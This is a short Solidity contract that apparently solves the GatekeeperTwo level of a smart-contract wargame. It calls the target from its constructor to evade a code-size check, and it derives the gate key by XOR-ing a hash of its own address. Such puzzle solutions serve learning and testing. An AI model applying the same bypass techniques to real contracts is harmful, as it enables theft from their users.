// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperTwoInvoker {

  constructor(address _add) {
      bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));
      GatekeeperTwo(_add).enter(gateKey);
  }

}